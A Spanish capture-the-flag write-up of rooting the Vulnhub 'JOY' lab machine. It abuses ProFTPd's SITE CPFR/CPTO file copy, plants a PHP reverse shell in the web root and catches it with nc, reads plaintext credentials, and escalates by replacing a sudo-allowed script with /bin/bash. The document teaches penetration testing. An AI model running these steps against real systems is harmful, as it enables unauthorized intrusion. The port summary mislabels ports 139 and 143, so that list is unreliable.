---
title: digitalworld.local-JOY Writeup - Vulnhub
date: 2025-02-20
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, digitalworld.local-JOY, OSCP Prep, FTP]
image:
  path: /assets/img/commons/vulnhub/joy/portada.png
---

Anterior [*OSCP Lab 10*](https://lvs3c.github.io/posts/OSCP-digitalworld.local/)

¡Saludos!

**`OSCP Lab 11`**

En este writeup, realizaremos la máquina [**digitalworld.local: JOY**](https://www.vulnhub.com/entry/digitalworldlocal-joy,298/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **FTP** explotación ProFTPd.
- **Upload File** mediante FTP para obtener la reverse shell.
- **User Pivoting** obteniendo la password de usuario de un archivo.
- Y por último, reemplazar un archivo por FTP el cual es ejecutado por root y al que tenemos permisos, convirtiéndonos en root y así obtener la flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.24     00:0c:29:5c:ff:b9       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.517 seconds (101.71 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.24
PING 10.11.12.24 (10.11.12.24) 56(84) bytes of data.
64 bytes from 10.11.12.24: icmp_seq=1 ttl=64 time=0.393 ms

--- 10.11.12.24 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.393/0.393/0.393/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.24 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 20:41 -03
Nmap scan report for 10.11.12.24
Host is up (0.0017s latency).
Not shown: 65523 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
MAC Address: 00:0C:29:5C:FF:B9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p21,22,25,80,110,139,143,445,465,587,993,995 -sCV 10.11.12.24 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 20:42 -03
Nmap scan report for 10.11.12.24
Host is up (0.00041s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 The Good Tech Inc. FTP Server
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL STLS PIPELINING UIDL TOP CAPA RESP-CODES AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS ID IMAP4rev1 ENABLE more IDLE OK post-login have capabilities LOGINDISABLEDA0001 SASL-IR listed STARTTLS Pre-login LITERAL+
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
993/tcp open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
995/tcp open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG
| Not valid before: 2019-01-27T17:23:23
|_Not valid after:  2032-10-05T17:23:23
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=2/20%Time=67B7BDF2%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,7F,"220\x20The\x20Good\x20Tech\x20Inc\.\x20FTP\x20Server\r\
SF:n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r\n500\
SF:x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r\n");
MAC Address: 00:0C:29:5C:FF:B9 (VMware)
Service Info: Hosts:  JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s
|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2025-02-21T07:43:01+08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-02-20T23:43:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 267.99 seconds
```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `Ftp`.
- Puerto `22` servidor `Dropbear sshd 0.34`.
- Puerto `25` servidor `Postfix smtpd`.
- Puerto `80` servidor `Apache httpd 2.4.25`.
- Puerto `110` servidor `Dovecot pop3d`.
- Puerto `139` servidor `Dovecot imapd`.
- Puerto `143` servidor `Apache 2.4.38`.
- Puerto `445` servidor `Samba smbd 4.5.12-Debian`.
- Puerto `465` servidor `Postfix smtpd`.
- Puerto `587` servidor `Postfix smtpd`.
- Puerto `993` servidor `Ssl/imaps`.
- Puerto `995` servidor `Ssl/pop3s`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.24/
http://10.11.12.24/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.11.12.24], Index-Of, Title[Index of /]
```

![web](/assets/img/commons/vulnhub/joy/web.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.24 -oN nmap_webscan
# Nmap 7.94SVN scan initiated Thu Feb 20 21:10:14 2025 as: nmap -p80 --script http-enum -oN nmap_webscan 10.11.12.24
Nmap scan report for 10.11.12.24
Host is up (0.00061s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /: Root directory w/ listing on 'apache/2.4.25 (debian)'
MAC Address: 00:0C:29:5C:FF:B9 (VMware)

# Nmap done at Thu Feb 20 21:10:15 2025 -- 1 IP address (1 host up) scanned in 1.23 seconds
```

Lanzamos `gobuster` pero tampoco tenemos mucha información.


### FTP - 21

Ingresamos al servicio `FTP`{: .filepath} con usuario `anonymous` y descargamos los archivos de la carpeta `upload`.

```bash
❯ ftp 10.11.12.24
Connected to 10.11.12.24.
220 The Good Tech Inc. FTP Server
Name (10.11.12.24:lvs3c): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2698|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Feb 25 15:53 upload
226 Transfer complete
ftp> cd upload
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||41811|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp         19333 Feb 25 17:06 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
-rw-r--r--   1 0        0             407 Feb 25 14:56 version_control
226 Transfer complete
ftp>
```

Listamos el contenido del archivo `directory`, el cual tiene más información.

![versioncontrol](/assets/img/commons/vulnhub/joy/versioncontrol.png){: .center-image }

Para descargar el archivo `version_control` debemos ingresar por `telnet` o `netcat` y copiar dicho archivo que se encuentra en el escritorio de `Patrick`en la carpeta `upload`{: .filepath} del usuario `ftp`.

```bash
❯ telnet 10.11.12.24 21
Trying 10.11.12.24...
Connected to 10.11.12.24.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
help
214-The following commands are recognized (* =>'s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST
 NLST    STAT    SITE    MLSD    MLST
214 Direct comments to root@JOY
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@JOY
site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
site cpto /home/ftp/upload/version_control
250 Copy successful
```

Lo descargamos y abrimos.

![version](/assets/img/commons/vulnhub/joy/version.png){: .center-image }

Tenemos la versión de FTP y el directorio por defecto de la aplicación web.


## Explotación

---

En este punto, sabiendo que podemos copiar y pegar archivos y la ruta por defecto del servidor web, vamos a cargar nuestro archivo `reverse shell`.

![rs](/assets/img/commons/vulnhub/joy/rs.png){: .center-image }

Primero subimos el archivo al directorio `upload` y luego lo movemos.

```bash
❯ ftp 10.11.12.24
Connected to 10.11.12.24.
220 The Good Tech Inc. FTP Server
Name (10.11.12.24:lvs3c): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39890|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Feb 25 15:09 upload
226 Transfer complete
ftp>
ftp> help
Commands may be abbreviated.  Commands are:

!               cr              ftp             macdef          msend           prompt          restart         sunique
$               debug           gate            mdelete         newer           proxy           rhelp           system
account         delete          get             mdir            nlist           put             rmdir           tenex
append          dir             glob            mget            nmap            pwd             rstatus         throttle
ascii           disconnect      hash            mkdir           ntrans          quit            runique         trace
bell            edit            help            mls             open            quote           send            type
binary          epsv            idle            mlsd            page            rate            sendport        umask
bye             epsv4           image           mlst            passive         rcvbuf          set             unset
case            epsv6           lcd             mode            pdir            recv            site            usage
cd              exit            less            modtime         pls             reget           size            user
cdup            features        lpage           more            pmlsd           remopts         sndbuf          verbose
chmod           fget            lpwd            mput            preserve        rename          status          xferbuf
close           form            ls              mreget          progress        reset           struct          ?
ftp> site help
214-The following SITE commands are recognized (* =>'s unimplemented)
 CPFR <sp> pathname
 CPTO <sp> pathname
 HELP
 CHGRP
 CHMOD
214 Direct comments to root@JOY

ftp> ls
229 Entering Extended Passive Mode (|||49100|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Feb 25 15:09 upload
226 Transfer complete

ftp> cd uplaod
550 uplaod: No such file or directory

ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||20548|)
150 Opening BINARY mode data connection for php-reverse-shell.php
100% |*************************************************************************************|  5493       32.53 MiB/s    00:00 ETA
226 Transfer complete
5493 bytes sent in 00:00 (8.42 MiB/s)
ftp>
```

```bash
❯ telnet 10.11.12.24 21
Trying 10.11.12.24...
Connected to 10.11.12.24.
Escape character is '^]'.
help
220 The Good Tech Inc. FTP Server
214-The following commands are recognized (* =>'s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST
 NLST    STAT    SITE    MLSD    MLST
214 Direct comments to root@JOY
site cpfr /home/ftp/upload/php-reverse-shell.php
350 File or directory exists, ready for destination name
site cpto /var/www/tryingharderisjoy/php-reverse-shell.php
250 Copy successful
```

![webrs](/assets/img/commons/vulnhub/joy/webrs.png){: .center-image }

Nos ponemos en escucha y lanzamos la conexión.

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.24] 45288
Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 02:00:13 up  4:08,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
/bin/sh: 0: can't access tty; job control turned off
$ tty
not a tty
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@JOY:/$
```

Nos dirigimos al directorio de `ossec` para validar archivos y encontramos la `password`{: .filepath} del usuario `patrick`.

```bash
www-data@JOY:/var/www/tryingharderisjoy/ossec$ ls
ls
CONTRIB  README.search     img        lib                  setup.sh
LICENSE  css               index.php  ossec_conf.php       site
README   htaccess_def.txt  js         patricksecretsofjoy  tmp
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
cat patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
```

También podríamos haber usado un exploit ya que la versión de `proftpd`{: .filepath} es vulnerable a ejecución de código.

![searchsploit](/assets/img/commons/vulnhub/joy/searchsploit.png){: .center-image }


## Escalación de privilegios

---

Ingresamos con el usuario `patrick` y con `sudo -l`{: .filepath} listamos los permisos sobre el sistema.

```bash
patrick@JOY:~$ sudo -l
sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test
patrick@JOY:~$
```

Tenemos permisos completos para ejecutar el archivo `test`{: .filepath}.

Probamos qué hace el script.

```bash
patrick@JOY:~$ sudo /home/patrick/script/test
sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
prueba
What permissions would you like to set the file to?
775
Currently changing file permissions, please wait.
chmod: cannot access '/home/patrick/script/prueba': No such file or directory
Tidying up...
Done!
```

Como observamos el script busca archivos dentro de la carpeta `script`, pero no tenemos acceso, sólo root.

Lo que podemos hacer, ya que no podemos modificar el contenido del archivo test, es reemplazarlo con uno nuestro mediante `ftp`, obteniendo la shell como root.

```bash
❯ cat rootshell
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: rootshell
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ /bin/bash
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ ftp 10.11.12.24
Connected to 10.11.12.24.
220 The Good Tech Inc. FTP Server
Name (10.11.12.24:lvs3c): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> cd upload
250 CWD command successful

ftp> put rootshell
local: rootshell remote: rootshell
229 Entering Extended Passive Mode (|||11578|)
150 Opening BINARY mode data connection for rootshell
100% |*************************************************************************|    10      171.32 KiB/s    00:00 ETA
226 Transfer complete
10 bytes sent in 00:00 (14.40 KiB/s)
ftp>
```

```bash
❯ telnet 10.11.12.24 21
Trying 10.11.12.24...
Connected to 10.11.12.24.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server

site cpfr /home/ftp/upload/rootshell
350 File or directory exists, ready for destination name

site cpto /home/patrick/script/test
250 Copy successful
```

```bash
patrick@JOY:~$ sudo /home/patrick/script/test
sudo /home/patrick/script/test

root@JOY:/home/patrick# cd /root
cd /root
root@JOY:~# ls
ls
author-secret.txt      dovecot.crt  dovecot.key     proof.txt   rootCA.pem
document-generator.sh  dovecot.csr  permissions.sh  rootCA.key  rootCA.srl

root@JOY:~# cat proof.txt
cat proof.txt
Never grant sudo permissions on scripts that perform system functions!

root@JOY:/# cat /local.txt
cat /local.txt
SNMP tells too much information about what may exist in a machine. :-)
```

Hope it helps!